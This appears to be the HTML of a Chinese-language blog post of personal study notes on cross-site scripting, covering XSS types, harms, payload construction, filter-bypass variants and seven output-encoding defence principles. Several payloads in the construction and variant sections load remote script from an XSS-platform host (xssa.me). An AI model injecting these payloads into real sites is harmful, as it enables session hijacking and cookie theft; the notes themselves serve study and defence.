@@ -1,0 +1,934 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang>
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2">
+
+<link rel="stylesheet" href="/css/main.css?v=7.0.1">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.0.1">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.0.1">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.0.1">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=7.0.1" color="#222">
+
+
+
+
+
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '7.0.1',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false,"dimmer":false},
+    back2top: true,
+    back2top_sidebar: false,
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="XSS(Cross Site Scripting)     用户输入超出开发者预期的数据，导致在网页中添加或修改页面代码，从而执行恶意操作。  XSS的分类 反射型XSS 持久型XSS DOM-based型XSS（客户端注入）">
+<meta name="keywords" content="Web">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XSS - 笔记整理">
+<meta property="og:url" content="https://oddboy.cn/2017/XSS-笔记整理/index.html">
+<meta property="og:site_name" content="Mr.Bingo&#39;s Blog">
+<meta property="og:description" content="XSS(Cross Site Scripting)     用户输入超出开发者预期的数据，导致在网页中添加或修改页面代码，从而执行恶意操作。  XSS的分类 反射型XSS 持久型XSS DOM-based型XSS（客户端注入）">
+<meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2019-03-13T06:36:07.779Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="XSS - 笔记整理">
+<meta name="twitter:description" content="XSS(Cross Site Scripting)     用户输入超出开发者预期的数据，导致在网页中添加或修改页面代码，从而执行恶意操作。  XSS的分类 反射型XSS 持久型XSS DOM-based型XSS（客户端注入）">
+
+
+
+
+
+
+  <link rel="canonical" href="https://oddboy.cn/2017/XSS-笔记整理/">
+
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>XSS - 笔记整理 | Mr.Bingo's Blog</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Mr.Bingo's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+      
+        <p class="site-subtitle">The world is a narrow bridge, and the most important thing is not to be afraid.</p>
+      
+    
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Toggle navigation bar">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>Home</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archives</a>
+
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+    
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+  
+  
+  
+  
+
+  
+
+  <span class="exturl github-corner" data-url="aHR0cHM6Ly9naXRodWIuY29tL29kYm95" title="Follow me on GitHub" aria-label="Follow me on GitHub"><svg width="80" height="80" viewbox="0 0 250 250" style="fill: #222; color: #fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"/><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"/><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"/></svg></span>
+
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://oddboy.cn/2017/XSS-笔记整理/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Mr.Bingo">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Mr.Bingo's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">XSS - 笔记整理
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2017-08-31 18:21:02" itemprop="dateCreated datePublished" datetime="2017-08-31T18:21:02+08:00">2017-08-31</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Edited on</span>
+                
+                <time title="Modified: 2019-03-13 14:36:07" itemprop="dateModified" datetime="2019-03-13T14:36:07+08:00">2019-03-13</time>
+              
+            
+          </span>
+
+          
+
+          
+            
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <blockquote>
+<p>  XSS(Cross Site Scripting)</p>
+</blockquote>
+<blockquote>
+<p>  用户输入超出开发者预期的数据，导致在网页中添加或修改页面代码，从而执行恶意操作。</p>
+</blockquote>
+<h3 id="XSS的分类"><a href="#XSS的分类" class="headerlink" title="XSS的分类"></a>XSS的分类</h3><ul>
+<li>反射型XSS</li>
+<li>持久型XSS</li>
+<li>DOM-based型XSS（客户端注入）<a id="more"></a>
+</li>
+</ul>
+<h3 id="XSS的危害"><a href="#XSS的危害" class="headerlink" title="XSS的危害"></a>XSS的危害</h3><ul>
+<li>Cookie资料窃取</li>
+<li>劫持用户会话</li>
+<li>广告弹窗</li>
+<li>网页挂马</li>
+<li>网站钓鱼</li>
+<li>按键记录</li>
+<li>…(JS能完成的任何功能)</li>
+</ul>
+<h3 id="XSS的构造"><a href="#XSS的构造" class="headerlink" title="XSS的构造"></a>XSS的构造</h3><ul>
+<li><h5 id="利用-lt-gt-标记注入HTML-JavaScript标签"><a href="#利用-lt-gt-标记注入HTML-JavaScript标签" class="headerlink" title="利用&lt;&gt;标记注入HTML/JavaScript标签"></a>利用&lt;&gt;标记注入HTML/JavaScript标签</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;sCRiPt sRC=http://xssa.me/EXgq&gt;&lt;/sCrIpT&gt;</span><br></pre></td></tr></table></figure>
+</li>
+<li><h5 id="利用HTML标签属性值执行XSS"><a href="#利用HTML标签属性值执行XSS" class="headerlink" title="利用HTML标签属性值执行XSS"></a>利用HTML标签属性值执行XSS</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;javascript:alert(1)&quot;&gt;click me&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">...除href/src外的其它类似属性</span><br></pre></td></tr></table></figure>
+</li>
+<li><h5 id="在HTML标签中注入事件"><a href="#在HTML标签中注入事件" class="headerlink" title="在HTML标签中注入事件"></a>在HTML标签中注入事件</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=&quot;javascript:alert(/XSS/)&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;img src=logo.png onload=s=createElement(&apos;script&apos;);body.appendChild(s);s.src=&apos;http://xssa.me/EXgq&apos;;&gt;</span><br><span class="line"></span><br><span class="line">&lt;input onfocus=a=&apos;scr&apos;;s=createElement(a+&apos;ipt&apos;);body.appendChild(s);s.src=&apos;http://xssa.me/EXgq&apos;; autofocus&gt;</span><br><span class="line"></span><br><span class="line">...各种on事件</span><br></pre></td></tr></table></figure>
+</li>
+<li><h5 id="利用CSS跨站"><a href="#利用CSS跨站" class="headerlink" title="利用CSS跨站"></a>利用CSS跨站</h5><blockquote>
+<p>  尝试多种样式表(css),均无效。原因未知</p>
+</blockquote>
+</li>
+</ul>
+<h3 id="XSS的变形"><a href="#XSS的变形" class="headerlink" title="XSS的变形"></a>XSS的变形</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;sCRiPt/SrC=//xssa.me/EXgq&gt;</span><br><span class="line"></span><br><span class="line">&lt;ScRiPt/**/src=http://xssa.me/EXgq&gt;&lt;/ScRiPt&gt;</span><br><span class="line"></span><br><span class="line">&lt;img src=1 onerror=$.get(&apos;http://xssa.me/EXgq&apos;)&gt;      (jquery)</span><br><span class="line"></span><br><span class="line">eval($.get(&apos;http://xssa.me/EXgq&apos;))            (jquery)</span><br><span class="line"></span><br><span class="line">&lt;svg/onload=document.body.appendChild(document.createElement(/script/.source)).src=&apos;http://xssa.me/EXgq&apos;</span><br></pre></td></tr></table></figure>
+<h3 id="XSS的防御"><a href="#XSS的防御" class="headerlink" title="XSS的防御"></a>XSS的防御</h3><p>原则1：不要在页面中插入任何不可信数据，除非这些数已经据根据下面几个原则进行了编码</p>
+<p>原则2：在将不可信数据插入到HTML标签之间时，对这些数据进行HTML Entity编码</p>
+<p><strong>HTML Entity编码</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&amp;     –&gt;     &amp;amp;</span><br><span class="line">&lt;     –&gt;     &amp;lt;</span><br><span class="line">&gt;     –&gt;     &amp;gt;</span><br><span class="line">”     –&gt;     &amp;quot;</span><br><span class="line">‘     –&gt;     &amp;#x27;</span><br><span class="line">/     –&gt;     &amp;#x2f;</span><br></pre></td></tr></table></figure></p>
+<p>原则3：在将不可信数据插入到HTML属性里时，对这些数据进行HTML属性编码</p>
+<blockquote>
+<p>  除了阿拉伯数字和字母，对其他所有的字符进行编码，只要该字符的ASCII码小于256。编码后输出的格式为 &#xHH; （以&amp;#x开头，HH则是指该字符对应的十六进制数字，分号作为结束符）</p>
+</blockquote>
+<blockquote>
+<p>  之所以编码规则如此严格，是因为开发者有时会忘记给属性的值部分加上引号。如果属性值部分没有使用引号的话，攻击者很容易就能闭合掉当前属性，随后即可插入攻击脚本。例如，如果属性没有使用引号，又没有对数据进行严格编码，那么一个空格符就可以闭合掉当前属性。</p>
+</blockquote>
+<blockquote>
+<p>  除了空格符可以闭合当前属性外，这些符号也可以：<br>%     *     +     ,     –     /     ;     &lt;     =     &gt;     ^     |     `(反单引号，IE会认为它是单引号)</p>
+</blockquote>
+<p>原则4：在将不可信数据插入到SCRIPT里时，对这些数据进行SCRIPT编码</p>
+<blockquote>
+<p>  除了阿拉伯数字和字母，对其他所有的字符进行编码，只要该字符的ASCII码小于256。编码后输出的格式为 \xHH （以 \x 开头，HH则是指该字符对应的十六进制数字</p>
+</blockquote>
+<blockquote>
+<p>  在对不可信数据做编码的时候，千万不能图方便使用反斜杠（ \ ）对特殊字符进行简单转义，比如将双引号 ” 转义成 \” ，这样做是不可靠的，因为浏览器在对页面做解析的时候，会先进行HTML解析，然后才是JavaScript解析，所以双引号很可能会被当做HTML字符进行HTML解析，这时双引号就可以突破代码的值部分，使得攻击者可以继续进行XSS攻击。</p>
+</blockquote>
+<p>原则5：在将不可信数据插入到Style属性里时，对这些数据进行CSS编码</p>
+<blockquote>
+<p>  除了阿拉伯数字和字母，对其他所有的字符进行编码，只要该字符的ASCII码小于256。编码后输出的格式为 \HH （以 \ 开头，HH则是指该字符对应的十六进制数字）</p>
+</blockquote>
+<p>原则6：在将不可信数据插入到HTML URL里时，对这些数据进行URL编码</p>
+<blockquote>
+<p>  除了阿拉伯数字和字母，对其他所有的字符进行编码，只要该字符的ASCII码小于256。编码后输出的格式为 %HH （以 % 开头，HH则是指该字符对应的十六进制数字）<br>  在对URL进行编码的时候，有两点是需要特别注意的：<br>  1) URL属性应该使用引号将值部分包围起来，否则攻击者可以很容易突破当前属性区域，插入后续攻击代码<br>  2) 不要对整个URL进行编码，因为不可信数据可能会被插入到href, src或者其他以URL为基础的属性里，这时需要对数据的起始部分的协议字段进行验证，否则攻击者可以改变URL的协议，例如从HTTP协议改为DATA伪协议，或者javascript伪协议。</p>
+</blockquote>
+<p>原则7：使用富文本时，使用XSS规则引擎进行编码过滤</p>
+<blockquote>
+<p>  针对富文本的特殊性，我们可以使用XSS规则引擎对用户输入进行编码过滤，只允许用户输入安全的HTML标签，如 b, i, p等，对其他数据进行HTML编码。需要注意的是，经过规则引擎编码过滤后的内容只能放在div, p等安全的HTML标签里，不要放到HTML标签的属性值里，更不要放到HTML事件处理属性里，或者放到SCRIPT标签里。</p>
+</blockquote>
+<h3 id="XSS-Cheat-Sheet"><a href="#XSS-Cheat-Sheet" class="headerlink" title="XSS Cheat Sheet"></a>XSS Cheat Sheet</h3><p><span class="exturl" data-url="aHR0cHM6Ly93d3cub3dhc3Aub3JnL2luZGV4LnBocC9YU1NfRmlsdGVyX0V2YXNpb25fQ2hlYXRfU2hlZXQ=" title="https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet">https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet<i class="fa fa-external-link"></i></span></p>
+<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul>
+<li>《XSS跨站脚本 攻击剖析与防御》<span class="exturl" data-url="aHR0cHM6Ly9wYW4uYmFpZHUuY29tL3MvMWN3RFVoZw==" title="https://pan.baidu.com/s/1cwDUhg">PDF 百度云<i class="fa fa-external-link"></i></span> (PS:书写的很一般，没必要买实体书，虽说我买了。)</li>
+<li><span class="exturl" data-url="aHR0cDovL3d3dy5mcmVlYnVmLmNvbS9hcnRpY2xlcy93ZWIvOTk3Ny5odG1s" title="http://www.freebuf.com/articles/web/9977.html">防御XSS的七条原则<i class="fa fa-external-link"></i></span></li>
+<li><span class="exturl" data-url="aHR0cHM6Ly93d3cub3dhc3Aub3JnL2luZGV4LnBocC9YU1NfRmlsdGVyX0V2YXNpb25fQ2hlYXRfU2hlZXQ=" title="https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet">XSS Filter Evasion Cheat Sheet<i class="fa fa-external-link"></i></span></li>
+</ul>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Web/" rel="tag"># Web</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/ms17-010-python脚本exploit/" rel="next" title="ms17-010 python脚本exploit">
+                <i class="fa fa-chevron-left"></i> ms17-010 python脚本exploit
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2017/百度统计JS脚本分析-流量伪造脚本/" rel="prev" title="百度统计JS脚本分析 & 流量伪造脚本">
+                百度统计JS脚本分析 & 流量伪造脚本 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">Mr.Bingo</p>
+              <div class="site-description motion-element" itemprop="description"></div>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">38</span>
+                    <span class="site-state-item-name">posts</span>
+                  </a>
+                </div>
+              
+
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">28</span>
+                    <span class="site-state-item-name">tags</span>
+                  
+                </div>
+              
+            </nav>
+          
+
+          
+
+          
+
+          
+            <div class="links-of-author motion-element">
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL29kYm95" title="GitHub &rarr; https://github.com/odboy"><i class="fa fa-fw fa-github"></i>GitHub</span>
+                </span>
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="mailto:bingo@oddboy.cn" title="E-Mail &rarr; mailto:bingo@oddboy.cn"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9PZGRCb3lDTg==" title="Twitter &rarr; https://twitter.com/OddBoyCN"><i class="fa fa-fw fa-twitter"></i>Twitter</span>
+                </span>
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <span class="exturl" data-url="aHR0cHM6Ly93ZWliby5jb20vdS81MDE3Mzc5ODQ0" title="Weibo &rarr; https://weibo.com/u/5017379844"><i class="fa fa-fw fa-weibo"></i>Weibo</span>
+                </span>
+              
+            </div>
+          
+
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </div>
+
+      
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#XSS的分类"><span class="nav-number">1.</span> <span class="nav-text">XSS的分类</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XSS的危害"><span class="nav-number">2.</span> <span class="nav-text">XSS的危害</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XSS的构造"><span class="nav-number">3.</span> <span class="nav-text">XSS的构造</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#利用-lt-gt-标记注入HTML-JavaScript标签"><span class="nav-number">3.0.1.</span> <span class="nav-text">利用&lt;&gt;标记注入HTML/JavaScript标签</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#利用HTML标签属性值执行XSS"><span class="nav-number">3.0.2.</span> <span class="nav-text">利用HTML标签属性值执行XSS</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#在HTML标签中注入事件"><span class="nav-number">3.0.3.</span> <span class="nav-text">在HTML标签中注入事件</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#利用CSS跨站"><span class="nav-number">3.0.4.</span> <span class="nav-text">利用CSS跨站</span></a></li></ol></li></ol><li class="nav-item nav-level-3"><a class="nav-link" href="#XSS的变形"><span class="nav-number">4.</span> <span class="nav-text">XSS的变形</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XSS的防御"><span class="nav-number">5.</span> <span class="nav-text">XSS的防御</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XSS-Cheat-Sheet"><span class="nav-number">6.</span> <span class="nav-text">XSS Cheat Sheet</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#参考资料"><span class="nav-number">7.</span> <span class="nav-text">参考资料</span></a></li></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+  
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">  <span class="exturl" data-url="aHR0cDovL3d3dy5taWl0YmVpYW4uZ292LmNu">京ICP备18031815号 </span>&copy; 2017 – <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Mr.Bingo</span>
+
+  
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+    
+
+    
+  </div>
+
+  
+
+<script>
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+
+  
+
+
+  <script src="/js/src/utils.js?v=7.0.1"></script>
+
+  <script src="/js/src/motion.js?v=7.0.1"></script>
+
+
+
+  
+  
+
+
+  <script src="/js/src/schemes/muse.js?v=7.0.1"></script>
+
+
+
+  
+  <script src="/js/src/scrollspy.js?v=7.0.1"></script>
+<script src="/js/src/post-details.js?v=7.0.1"></script>
+
+
+
+  
+
+
+  <script src="/js/src/next-boot.js?v=7.0.1"></script>
+
+
+  
+
+  
+  <script src="/js/src/exturl.js?v=7.0.1"></script>
+
+
+  
+
+  
+
+
+  
+
+
+  
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
